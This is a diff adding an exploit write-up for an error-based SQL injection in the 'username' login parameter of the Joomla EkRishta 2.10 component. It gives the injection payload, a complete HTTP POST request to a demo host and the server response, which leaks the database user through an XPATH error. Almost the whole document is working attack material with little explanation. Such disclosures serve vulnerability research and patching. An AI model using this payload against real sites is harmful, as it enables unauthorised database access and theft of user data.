@@ -1,0 +1,47 @@
+# Exploit Title: Joomla! Component EkRishta 2.10 - 'username' SQL Injection
+# Date: 2018-06-11
+# Exploit Author: L0RD
+# Software Link: https://extensions.joomla.org/extension/ek-rishta/
+# Vendor Homepage: https://www.joomlaextensions.co.in/
+# Version: 2.10
+# Tested on: Win 10
+
+# POC : SQLi :
+# Parameter : username
+# Type : Error based
+# Payload : 1' AND extractvalue(1,concat(0x3a,user(),0x3a))#
+# Test : http://joomlaextension.biz/ekrishta/index.php/login/sign-in
+
+# Request
+
+POST /ekrishta/index.php/login/sign-in HTTP/1.1
+Host: joomlaextension.biz
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://joomlaextension.biz/ekrishta/index.php/login/sign-in
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 264
+Cookie: 2b59fab16cbbad2fc73d64e5cc7a2950=k0fcnijgbnnk4i8f15bem38vp3;
+joomla_user_state=logged_in
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+username=1' AND
+extractvalue(1,concat(0x3a,user(),0x3a))#&passwd=test%27&Submit=Log+in+to+your+account&Itemid=117&option=com_ekrishta&view=alluser&task=check_login&lid=loginuser&return=L2VrcmlzaHRhL2luZGV4LnBocC9sb2dpbi9zaWduLWlu&bac2b97217cd995b069b5b0bc198de1c=1
+
+# Response
+
+HTTP/1.1 500 XPATH syntax error: ':harmiste_rishtaa@localhost:' SQL=select
+* from #__users where username='1' AND
+extractvalue(1,concat(0x3a,user(),0x3a))#'
+Server: nginx
+Date: Mon, 11 Jun 2018 17:05:00 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Cache-Control: no-cache
+Pragma: no-cache
+Host-Header: 192fc2e7e50945beb8231a492d6a8024
+Content-Length: 3181
